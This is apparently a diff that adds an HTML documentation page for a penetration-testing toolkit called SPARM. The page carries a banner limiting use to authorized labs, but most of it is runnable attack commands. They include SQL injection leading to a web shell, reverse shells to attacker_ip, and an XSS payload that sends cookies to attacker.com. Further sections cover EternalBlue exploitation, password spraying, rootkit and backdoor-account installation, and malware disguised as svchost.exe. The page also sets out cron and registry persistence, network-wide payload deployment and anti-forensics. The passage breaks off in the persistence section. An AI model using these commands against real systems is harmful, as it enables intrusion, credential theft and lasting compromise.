@@ -1,0 +1,1220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SPARM - Enhanced Documentation & Methodologies</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 100%);
+            color: #e0e0e0;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        header {
+            background: linear-gradient(135deg, #2d2d44 0%, #16213e 100%);
+            border-radius: 10px;
+            padding: 30px;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            text-align: center;
+        }
+
+        .logo {
+            font-size: 3em;
+            font-weight: bold;
+            color: #00ff41;
+            text-shadow: 0 2px 10px rgba(0, 255, 65, 0.5);
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            color: #ff6b6b;
+            font-size: 1.2em;
+            margin-bottom: 15px;
+        }
+
+        .warning {
+            background: #ff4757;
+            color: white;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+            border-left: 5px solid #ff3742;
+        }
+
+        nav {
+            background: #2f3542;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 30px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        nav ul {
+            list-style: none;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        nav a {
+            color: #00ff41;
+            text-decoration: none;
+            padding: 8px 12px;
+            border-radius: 5px;
+            transition: all 0.3s ease;
+            border: 1px solid transparent;
+            font-size: 0.9em;
+        }
+
+        nav a:hover {
+            background: #00ff41;
+            color: #000;
+            border-color: #00ff41;
+        }
+
+        .section {
+            background: #2f3542;
+            border-radius: 10px;
+            padding: 30px;
+            margin-bottom: 30px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        h1, h2, h3 {
+            color: #00ff41;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 2.5em;
+            text-shadow: 0 2px 5px rgba(0, 255, 65, 0.3);
+            text-align: center;
+        }
+
+        h2 {
+            font-size: 2em;
+            border-bottom: 2px solid #00ff41;
+            padding-bottom: 10px;
+        }
+
+        h3 {
+            font-size: 1.5em;
+            color: #ffa502;
+        }
+
+        .phase-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+            gap: 30px;
+            margin-top: 30px;
+        }
+
+        .phase-card {
+            background: #1e2124;
+            border-radius: 12px;
+            padding: 25px;
+            border-left: 5px solid #00ff41;
+            transition: transform 0.3s ease;
+        }
+
+        .phase-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+        }
+
+        .phase-number {
+            background: #00ff41;
+            color: #000;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 1.2em;
+            margin-bottom: 15px;
+        }
+
+        .phase-title {
+            color: #00ff41;
+            font-size: 1.4em;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+
+        .combo-box {
+            background: #1a1a2e;
+            border: 2px solid #ff6b6b;
+            border-radius: 12px;
+            padding: 25px;
+            margin: 25px 0;
+        }
+
+        .combo-title {
+            color: #ff6b6b;
+            font-size: 1.3em;
+            font-weight: bold;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .workflow-section {
+            background: #16213e;
+            border-left: 4px solid #ffa502;
+            padding: 25px;
+            margin: 25px 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .step {
+            background: #2d2d44;
+            padding: 20px;
+            margin: 15px 0;
+            border-radius: 8px;
+            border-left: 4px solid #ffa502;
+        }
+
+        .step-header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+
+        .step-number {
+            background: #ffa502;
+            color: #000;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+
+        .step-title {
+            color: #ffa502;
+            font-size: 1.1em;
+            font-weight: bold;
+        }
+
+        .code-block {
+            background: #0f0f0f;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 15px 0;
+            font-family: 'Courier New', monospace;
+            overflow-x: auto;
+            color: #00ff41;
+            position: relative;
+        }
+
+        .code-header {
+            color: #ffa502;
+            font-weight: bold;
+            margin-bottom: 10px;
+            font-size: 0.9em;
+        }
+
+        .command {
+            color: #ff6b6b;
+            font-weight: bold;
+        }
+
+        .comment {
+            color: #888;
+            font-style: italic;
+        }
+
+        .tool-showcase {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 25px;
+            margin: 25px 0;
+        }
+
+        .tool-card {
+            background: #1e2124;
+            border-radius: 10px;
+            padding: 25px;
+            border-left: 4px solid #00ff41;
+            transition: all 0.3s ease;
+        }
+
+        .tool-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
+        }
+
+        .tool-name {
+            color: #00ff41;
+            font-size: 1.3em;
+            font-weight: bold;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .advanced-technique {
+            background: #2a2a40;
+            border: 2px solid #ff6b6b;
+            border-radius: 10px;
+            padding: 25px;
+            margin: 25px 0;
+        }
+
+        .technique-title {
+            color: #ff6b6b;
+            font-size: 1.3em;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+
+        .completion-checklist {
+            background: #1a2a1a;
+            border-left: 4px solid #00ff41;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .checklist-title {
+            color: #00ff41;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+
+        .checklist-item {
+            margin: 8px 0;
+            padding-left: 20px;
+            position: relative;
+        }
+
+        .checklist-item::before {
+            content: "✓";
+            color: #00ff41;
+            font-weight: bold;
+            position: absolute;
+            left: 0;
+        }
+
+        .tab-container {
+            margin: 25px 0;
+        }
+
+        .tab-buttons {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .tab-button {
+            background: #2d2d44;
+            color: #e0e0e0;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .tab-button.active {
+            background: #00ff41;
+            color: #000;
+        }
+
+        .tab-content {
+            display: none;
+            background: #1e2124;
+            padding: 25px;
+            border-radius: 8px;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .warning-box {
+            background: #4a1a1a;
+            border: 2px solid #ff4757;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .warning-title {
+            color: #ff4757;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        @media (max-width: 768px) {
+            .phase-grid, .tool-showcase {
+                grid-template-columns: 1fr;
+            }
+            
+            .logo {
+                font-size: 2em;
+            }
+            
+            nav ul {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">SPARM</div>
+            <div class="subtitle">Advanced SPARM Toolkit Documentation & Methodologies</div>
+            <div class="warning">
+                ⚠️ SPARM ADVANCED FEATURES - AUTHORIZED TESTING ENVIRONMENTS ONLY ⚠️<br>
+                This comprehensive guide covers advanced SPARM toolkit capabilities, complete penetration testing methodologies, and professional security workflows for cybersecurity professionals, students, and authorized penetration testers working in controlled lab environments.
+            </div>
+        </header>
+
+        <nav>
+            <ul>
+                <li><a href="#complete-methodology">Complete Methodology</a></li>
+                <li><a href="#recon-mastery">Reconnaissance Mastery</a></li>
+                <li><a href="#exploitation-combos">Exploitation Combos</a></li>
+                <li><a href="#post-exploitation">Post-Exploitation</a></li>
+                <li><a href="#advanced-techniques">Advanced Techniques</a></li>
+                <li><a href="#tool-chaining">Tool Chaining</a></li>
+                <li><a href="#complete-control">Gaining Complete Control</a></li>
+                <li><a href="#persistence-methods">Persistence Methods</a></li>
+                <li><a href="#stealth-techniques">Stealth Techniques</a></li>
+                <li><a href="#reporting">Professional Reporting</a></li>
+            </ul>
+        </nav>
+
+        <section id="complete-methodology" class="section">
+            <h1>🎯 Complete Penetration Testing Methodology</h1>
+            
+            <div class="phase-grid">
+                <div class="phase-card">
+                    <div class="phase-number">1</div>
+                    <div class="phase-title">Intelligence Gathering</div>
+                    <p><strong>Objective:</strong> Collect maximum information about the target without direct interaction.</p>
+                    <ul>
+                        <li>OSINT collection</li>
+                        <li>Social media reconnaissance</li>
+                        <li>DNS enumeration</li>
+                        <li>Employee information gathering</li>
+                        <li>Technology stack identification</li>
+                    </ul>
+                </div>
+
+                <div class="phase-card">
+                    <div class="phase-number">2</div>
+                    <div class="phase-title">Active Reconnaissance</div>
+                    <p><strong>Objective:</strong> Identify live systems, open ports, and running services.</p>
+                    <ul>
+                        <li>Network discovery</li>
+                        <li>Port scanning</li>
+                        <li>Service enumeration</li>
+                        <li>Version detection</li>
+                        <li>OS fingerprinting</li>
+                    </ul>
+                </div>
+
+                <div class="phase-card">
+                    <div class="phase-number">3</div>
+                    <div class="phase-title">Vulnerability Assessment</div>
+                    <p><strong>Objective:</strong> Identify security weaknesses and potential attack vectors.</p>
+                    <ul>
+                        <li>Automated vulnerability scanning</li>
+                        <li>Manual testing</li>
+                        <li>Web application assessment</li>
+                        <li>Network service testing</li>
+                        <li>Configuration review</li>
+                    </ul>
+                </div>
+
+                <div class="phase-card">
+                    <div class="phase-number">4</div>
+                    <div class="phase-title">Initial Exploitation</div>
+                    <p><strong>Objective:</strong> Gain initial access to target systems.</p>
+                    <ul>
+                        <li>Exploit development/selection</li>
+                        <li>Payload creation</li>
+                        <li>Social engineering</li>
+                        <li>Web application exploitation</li>
+                        <li>Network service exploitation</li>
+                    </ul>
+                </div>
+
+                <div class="phase-card">
+                    <div class="phase-number">5</div>
+                    <div class="phase-title">Post-Exploitation</div>
+                    <p><strong>Objective:</strong> Maintain access and gather additional information.</p>
+                    <ul>
+                        <li>Privilege escalation</li>
+                        <li>Lateral movement</li>
+                        <li>Data exfiltration</li>
+                        <li>Persistence establishment</li>
+                        <li>Evidence collection</li>
+                    </ul>
+                </div>
+
+                <div class="phase-card">
+                    <div class="phase-number">6</div>
+                    <div class="phase-title">Reporting & Remediation</div>
+                    <p><strong>Objective:</strong> Document findings and provide actionable recommendations.</p>
+                    <ul>
+                        <li>Executive summary</li>
+                        <li>Technical findings</li>
+                        <li>Risk assessment</li>
+                        <li>Remediation guidance</li>
+                        <li>Proof of concept</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <section id="recon-mastery" class="section">
+            <h2>🔍 Reconnaissance Mastery Guide</h2>
+            
+            <div class="workflow-section">
+                <h3>Phase 1: Passive Information Gathering</h3>
+                
+                <div class="step">
+                    <div class="step-header">
+                        <div class="step-number">1</div>
+                        <div class="step-title">OSINT Collection Framework</div>
+                    </div>
+                    <p>Begin with comprehensive open-source intelligence gathering to build a complete target profile.</p>
+                    
+                    <div class="code-block">
+                        <div class="code-header">🔎 Complete OSINT Workflow</div>
+<span class="command"># Domain and subdomain enumeration</span>
+theHarvester -d target.com -l 500 -b all -f theharvester_results
+amass enum -passive -d target.com -o passive_subdomains.txt
+subfinder -d target.com -o subfinder_results.txt
+
+<span class="command"># Social media and employee reconnaissance</span>
+sherlock username_list.txt --timeout 10 --output sherlock_results/
+python3 linkedin2username.py -c "Company Name" -n company_employees.txt
+
+<span class="command"># DNS intelligence gathering</span>
+dnsrecon -d target.com -t std,rvl,brt,srv,axfr
+dnsenum target.com --enum -o dnsenum_results.txt
+fierce --domain target.com --subdomain-file subdomains.txt
+
+<span class="command"># Technology stack identification</span>
+whatweb -a 3 -v target.com
+builtwith target.com
+wappalyzer target.com
+                    </div>
+                </div>
+
+                <div class="step">
+                    <div class="step-header">
+                        <div class="step-number">2</div>
+                        <div class="step-title">Email and Credential Harvesting</div>
+                    </div>
+                    <p>Collect email addresses and potential credentials from public sources.</p>
+                    
+                    <div class="code-block">
+                        <div class="code-header">📧 Email & Credential Collection</div>
+<span class="command"># Advanced email harvesting</span>
+theHarvester -d target.com -l 1000 -b google,bing,linkedin,twitter,yahoo -f emails.xml
+python3 h8mail -t emails.txt --bc --loose
+
+<span class="command"># Breach database searching</span>
+python3 h8mail -t target_emails.txt --bc --sk --loose
+dehashed -e "email@target.com" -p
+
+<span class="command"># Username generation</span>
+python3 linkedin2username.py -c "Target Company" -n usernames.txt
+python3 username-anarchy -i names.txt > potential_usernames.txt
+                    </div>
+                </div>
+            </div>
+
+            <div class="combo-box">
+                <div class="combo-title">🎯 ULTIMATE RECON COMBO: Complete Target Profiling</div>
+                <div class="code-block">
+                    <div class="code-header">⚡ Automated Reconnaissance Script</div>
+<span class="command">#!/bin/bash
+# Ultimate SPARM Reconnaissance Script
+# Usage: ./ultimate_recon.sh target.com</span>
+
+TARGET=$1
+RESULTS_DIR="recon_results_$(date +%Y%m%d_%H%M%S)"
+mkdir -p $RESULTS_DIR && cd $RESULTS_DIR
+
+<span class="command"># Phase 1: Passive Intelligence</span>
+echo "[+] Starting passive reconnaissance for $TARGET"
+theHarvester -d $TARGET -l 1000 -b all -f theharvester_full.xml
+amass enum -passive -d $TARGET -o amass_passive.txt
+subfinder -d $TARGET -silent -o subfinder.txt
+
+<span class="command"># Phase 2: DNS Enumeration</span>
+echo "[+] DNS enumeration phase"
+dnsrecon -d $TARGET -t std,rvl,brt,srv,axfr -c dnsrecon_results.csv
+dnsenum $TARGET --enum -o dnsenum.txt
+fierce --domain $TARGET --subdomain-file /usr/share/wordlists/fierce/hosts.txt > fierce.txt
+
+<span class="command"># Phase 3: Active Reconnaissance</span>
+echo "[+] Active reconnaissance phase"
+cat amass_passive.txt subfinder.txt | sort -u > all_subdomains.txt
+nmap -sn -iL all_subdomains.txt | grep "Nmap scan report" | awk '{print $5}' > live_hosts.txt
+
+<span class="command"># Phase 4: Port Discovery</span>
+echo "[+] Port scanning phase"
+nmap -sS -T4 -p- --min-rate=1000 -iL live_hosts.txt -oA full_port_scan
+nmap -sV -sC -O -T4 -p $(cat full_port_scan.gnmap | grep -o '[0-9]*/open' | cut -d'/' -f1 | sort -n | uniq | paste -sd,) -iL live_hosts.txt -oA detailed_scan
+
+<span class="command"># Phase 5: Service Enumeration</span>
+echo "[+] Service enumeration phase"
+for host in $(cat live_hosts.txt); do
+    echo "[+] Enumerating $host"
+    gobuster dir -u http://$host -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster_$host.txt &
+    nikto -h $host -o nikto_$host.txt &
+done
+wait
+
+echo "[+] Reconnaissance complete! Results saved in $RESULTS_DIR"</div>
+            </div>
+        </section>
+
+        <section id="exploitation-combos" class="section">
+            <h2>💥 Advanced Exploitation Combinations</h2>
+
+            <div class="tab-container">
+                <div class="tab-buttons">
+                    <button class="tab-button active" onclick="showTab('web-exploitation')">Web Application</button>
+                    <button class="tab-button" onclick="showTab('network-exploitation')">Network Services</button>
+                    <button class="tab-button" onclick="showTab('database-exploitation')">Database Attacks</button>
+                    <button class="tab-button" onclick="showTab('credential-attacks')">Credential Attacks</button>
+                </div>
+
+                <div id="web-exploitation" class="tab-content active">
+                    <h3>🌐 Web Application Exploitation Combos</h3>
+                    
+                    <div class="advanced-technique">
+                        <div class="technique-title">🔥 SQL Injection to Remote Code Execution</div>
+                        
+                        <div class="step">
+                            <div class="step-header">
+                                <div class="step-number">1</div>
+                                <div class="step-title">Discovery & Enumeration</div>
+                            </div>
+                            <div class="code-block">
+<span class="command"># Identify SQL injection points</span>
+sqlmap -u "http://target.com/page.php?id=1" --batch --risk=3 --level=5 --dbs
+
+<span class="command"># Enumerate database structure</span>
+sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
+sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --columns
+sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump
+
+<span class="command"># Check for file system access</span>
+sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"
+sqlmap -u "http://target.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
+                            </div>
+                        </div>
+
+                        <div class="step">
+                            <div class="step-header">
+                                <div class="step-number">2</div>
+                                <div class="step-title">Privilege Escalation via SQL</div>
+                            </div>
+                            <div class="code-block">
+<span class="command"># Escalate database privileges</span>
+sqlmap -u "http://target.com/page.php?id=1" --sql-shell
+<span class="comment"># In SQL shell:</span>
+GRANT ALL PRIVILEGES ON *.* TO 'current_user'@'%';
+SELECT user();
+SELECT @@version;
+
+<span class="command"># Upload web shell via SQL</span>
+sqlmap -u "http://target.com/page.php?id=1" --os-shell
+<span class="comment"># Or manually:</span>
+SELECT '&lt;?php system($_GET["cmd"]); ?&gt;' INTO OUTFILE '/var/www/html/cmd.php';
+                            </div>
+                        </div>
+
+                        <div class="step">
+                            <div class="step-header">
+                                <div class="step-number">3</div>
+                                <div class="step-title">Remote Code Execution</div>
+                            </div>
+                            <div class="code-block">
+<span class="command"># Access uploaded shell</span>
+curl "http://target.com/cmd.php?cmd=whoami"
+curl "http://target.com/cmd.php?cmd=id"
+
+<span class="command"># Establish reverse shell</span>
+curl "http://target.com/cmd.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker_ip\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+
+<span class="command"># Or using nc</span>
+curl "http://target.com/cmd.php?cmd=nc -e /bin/bash attacker_ip 4444"
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="advanced-technique">
+                        <div class="technique-title">🎭 XSS to Session Hijacking & Admin Access</div>
+                        
+                        <div class="code-block">
+<span class="command"># Discovery and testing</span>
+python3 XSStrike.py -u "http://target.com/search.php?q=test"
+echo "target.com" | gau | grep "=" | qsreplace '"><script>alert(1)</script>' | while read url; do curl -s "$url" | grep -q "alert(1)" && echo "XSS: $url"; done
+
+<span class="command"># Cookie stealing payload</span>
+&lt;script&gt;
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "http://attacker.com/steal.php?cookie=" + document.cookie, true);
+xhr.send();
+&lt;/script&gt;
+
+<span class="command"># Admin session exploitation</span>
+&lt;script&gt;
+var adminReq = new XMLHttpRequest();
+adminReq.open("POST", "/admin/add_user.php", true);
+adminReq.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+adminReq.send("username=backdoor&password=password123&role=admin");
+&lt;/script&gt;
+                        </div>
+                    </div>
+                </div>
+
+                <div id="network-exploitation" class="tab-content">
+                    <h3>🌐 Network Service Exploitation</h3>
+                    
+                    <div class="advanced-technique">
+                        <div class="technique-title">🔓 SMB Exploitation Chain</div>
+                        
+                        <div class="code-block">
+<span class="command"># SMB enumeration</span>
+smbclient -L //target_ip -N
+smbmap -H target_ip -u anonymous
+enum4linux -a target_ip
+
+<span class="command"># SMB vulnerability scanning</span>
+nmap --script smb-vuln* target_ip
+msfconsole -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS target_ip; run"
+
+<span class="command"># EternalBlue exploitation</span>
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS target_ip
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST attacker_ip
+set LPORT 4444
+exploit
+
+<span class="command"># Post-exploitation</span>
+<span class="comment"># From meterpreter session:</span>
+hashdump
+run post/windows/gather/credentials/credential_collector
+run post/windows/gather/enum_domain
+run post/windows/manage/enable_rdp
+                        </div>
+                    </div>
+
+                    <div class="advanced-technique">
+                        <div class="technique-title">🔑 SSH Key-Based Attacks</div>
+                        
+                        <div class="code-block">
+<span class="command"># SSH enumeration and brute force</span>
+nmap -p 22 --script ssh-auth-methods target_ip
+hydra -L users.txt -P passwords.txt ssh://target_ip
+
+<span class="command"># SSH key hunting</span>
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x .ssh,.key,.pem
+curl http://target.com/.ssh/id_rsa
+
+<span class="command"># Key-based access</span>
+chmod 600 id_rsa
+ssh -i id_rsa user@target_ip
+
+<span class="command"># SSH tunneling for lateral movement</span>
+ssh -L 8080:internal_server:80 user@target_ip
+ssh -D 1080 user@target_ip  <span class="comment"># SOCKS proxy</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="database-exploitation" class="tab-content">
+                    <h3>💾 Database Exploitation Techniques</h3>
+                    
+                    <div class="advanced-technique">
+                        <div class="technique-title">🎯 Multi-Database Attack Chain</div>
+                        
+                        <div class="code-block">
+<span class="command"># MySQL exploitation</span>
+mysql -h target_ip -u root -p
+<span class="comment"># In MySQL:</span>
+SELECT load_file('/etc/passwd');
+SELECT '&lt;?php system($_GET["cmd"]); ?&gt;' INTO OUTFILE '/var/www/html/shell.php';
+CREATE USER 'backdoor'@'%' IDENTIFIED BY 'password123';
+GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%';
+
+<span class="command"># PostgreSQL exploitation</span>
+psql -h target_ip -U postgres
+<span class="comment"># In PostgreSQL:</span>
+COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/attacker_ip/4444 0>&1"';
+CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
+SELECT system('nc -e /bin/bash attacker_ip 4444');
+
+<span class="command"># MongoDB exploitation</span>
+mongo target_ip:27017
+<span class="comment"># In MongoDB:</span>
+use admin
+db.runCommand({eval: "function() { return 'MongoDB Shell Access Gained'; }"})
+db.fs.files.insert({filename: "/etc/passwd", data: "malicious_content"})
+                        </div>
+                    </div>
+                </div>
+
+                <div id="credential-attacks" class="tab-content">
+                    <h3>🔐 Advanced Credential Attack Combinations</h3>
+                    
+                    <div class="advanced-technique">
+                        <div class="technique-title">⚔️ Multi-Vector Credential Assault</div>
+                        
+                        <div class="code-block">
+<span class="command"># Password spraying across multiple services</span>
+crackmapexec smb target_network/24 -u users.txt -p 'Spring2024!' --continue-on-success
+crackmapexec ssh target_network/24 -u users.txt -p passwords.txt --continue-on-success
+crackmapexec winrm target_network/24 -u users.txt -p passwords.txt
+
+<span class="command"># Hash-based attacks</span>
+crackmapexec smb target_ip -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:hash_here'
+python3 secretsdump.py domain/user:password@target_ip
+
+<span class="command"># Kerberoasting attack</span>
+python3 GetNPUsers.py domain.com/ -usersfile users.txt -format hashcat -outputfile hashes.txt
+python3 GetUserSPNs.py domain.com/user:password -dc-ip dc_ip -request
+
+<span class="command"># Hash cracking</span>
+hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt --force
+john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="complete-control" class="section">
+            <h2>👑 Gaining Complete System Control</h2>
+            
+            <div class="workflow-section">
+                <h3>🎯 Complete Control Achievement Framework</h3>
+                
+                <div class="step">
+                    <div class="step-header">
+                        <div class="step-number">1</div>
+                        <div class="step-title">Initial Access Establishment</div>
+                    </div>
+                    <p>Secure your initial foothold using multiple attack vectors simultaneously.</p>
+                    
+                    <div class="code-block">
+                        <div class="code-header">🚪 Multi-Vector Initial Access</div>
+<span class="command"># Web application exploitation</span>
+sqlmap -u "http://target.com/login.php" --data="username=admin&password=test" --method=POST --os-shell
+
+<span class="command"># Network service exploitation</span>
+msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS target_ip; set payload windows/x64/meterpreter/reverse_tcp; set LHOST attacker_ip; exploit"
+
+<span class="command"># Social engineering payload</span>
+msfvenom -p windows/meterpreter/reverse_https LHOST=attacker_ip LPORT=443 -f exe > legitimate_software.exe
+
+<span class="command"># Simultaneous listener setup</span>
+msfconsole -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST attacker_ip; set LPORT 4444; exploit -j"
+                    </div>
+                </div>
+
+                <div class="step">
+                    <div class="step-header">
+                        <div class="step-number">2</div>
+                        <div class="step-title">Privilege Escalation Mastery</div>
+                    </div>
+                    <p>Escalate privileges using multiple techniques to achieve administrative/root access.</p>
+                    
+                    <div class="code-block">
+                        <div class="code-header">⬆️ Advanced Privilege Escalation</div>
+<span class="command"># Automated privilege escalation scanning</span>
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+python3 -c "import urllib.request; urllib.request.urlretrieve('https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat', 'winpeas.bat')"
+
+<span class="command"># Kernel exploit identification</span>
+python3 linux-exploit-suggester.py
+systeminfo | python3 windows-exploit-suggester.py --database 2024-exploits.xlsx --systeminfo -
+
+<span class="command"># Service exploitation</span>
+<span class="comment"># Check for writable service binaries</span>
+find / -writable -type f -executable 2>/dev/null | grep -E "(bin|sbin)"
+sc query state= all | findstr "SERVICE_NAME"
+
+<span class="command"># SUID/SGID binary exploitation</span>
+find / -perm -u=s -type f 2>/dev/null
+find / -perm -g=s -type f 2>/dev/null
+<span class="comment"># Check GTFOBins for exploitation methods</span>
+
+<span class="command"># Scheduled tasks/cron job hijacking</span>
+crontab -l
+cat /etc/crontab
+schtasks /query /fo LIST /v
+                    </div>
+                </div>
+
+                <div class="step">
+                    <div class="step-header">
+                        <div class="step-number">3</div>
+                        <div class="step-title">Complete System Domination</div>
+                    </div>
+                    <p>Achieve total system control through multiple persistence mechanisms.</p>
+                    
+                    <div class="code-block">
+                        <div class="code-header">👑 Total System Control</div>
+<span class="command"># Create privileged user accounts</span>
+useradd -m -s /bin/bash -G sudo backdoor
+echo 'backdoor:password123' | chpasswd
+net user backdoor password123 /add
+net localgroup administrators backdoor /add
+
+<span class="command"># Install rootkits and backdoors</span>
+<span class="comment"># Linux rootkit installation</span>
+git clone https://github.com/f0rb1dd3n/Reptile.git
+cd Reptile && make && make install
+
+<span class="comment"># Windows backdoor installation</span>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=443 -f exe > svchost.exe
+copy svchost.exe C:\Windows\System32\
+sc create "Windows Update Service" binPath= "C:\Windows\System32\svchost.exe" start= auto
+
+<span class="command"># SSH key-based persistence</span>
+mkdir -p ~/.ssh
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC..." >> ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+
+<span class="command"># Registry-based persistence (Windows)</span>
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Windows\System32\svchost.exe"
+
+<span class="command"># Cron-based persistence (Linux)</span>
+echo "* * * * * /usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker_ip\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" | crontab -
+                    </div>
+                </div>
+
+                <div class="step">
+                    <div class="step-header">
+                        <div class="step-number">4</div>
+                        <div class="step-title">Network Domination</div>
+                    </div>
+                    <p>Expand control across the entire network infrastructure.</p>
+                    
+                    <div class="code-block">
+                        <div class="code-header">🌐 Network-Wide Control</div>
+<span class="command"># Network discovery and mapping</span>
+nmap -sn 192.168.1.0/24
+nmap -sS -T4 -A 192.168.1.0/24 -oA network_scan
+
+<span class="command"># Lateral movement via SMB</span>
+crackmapexec smb 192.168.1.0/24 -u administrator -p password --exec-method smbexec -x "whoami"
+python3 smbexec.py domain/user:password@target_ip
+
+<span class="command"># Domain controller compromise</span>
+python3 secretsdump.py domain.com/user:password@dc_ip
+python3 goldenPac.py domain.com/user:password@target_ip
+
+<span class="command"># Network-wide backdoor deployment</span>
+for ip in $(nmap -sL 192.168.1.0/24 | grep "Nmap scan report" | awk '{print $5}'); do
+    crackmapexec smb $ip -u administrator -p password -x "powershell -e [base64_encoded_payload]"
+done
+
+<span class="command"># Traffic interception and manipulation</span>
+ettercap -T -M arp:remote /192.168.1.1// /192.168.1.0/24//
+bettercap -iface eth0
+                    </div>
+                </div>
+            </div>
+
+            <div class="completion-checklist">
+                <div class="checklist-title">🎯 Complete Control Achievement Checklist</div>
+                <div class="checklist-item">Administrative/root access on target system</div>
+                <div class="checklist-item">Multiple persistence mechanisms installed</div>
+                <div class="checklist-item">Network reconnaissance completed</div>
+                <div class="checklist-item">Lateral movement capabilities established</div>
+                <div class="checklist-item">Credential harvesting successful</div>
+                <div class="checklist-item">Data exfiltration mechanisms in place</div>
+                <div class="checklist-item">Backdoors and rootkits deployed</div>
+                <div class="checklist-item">Domain-wide access achieved (if applicable)</div>
+                <div class="checklist-item">Anti-forensics measures implemented</div>
+                <div class="checklist-item">Complete documentation of compromise path</div>
+            </div>
+        </section>
+
+        <section id="persistence-methods" class="section">
+            <h2>🔒 Advanced Persistence Techniques</h2>
+            
+            <div class="tool-showcase">
+                <div class="tool-card">
+                    <div class="tool-name">🐧 Linux Persistence Arsenal</div>
+                    <div class="code-block">
+<span class="command"># Service-based persistence</span>
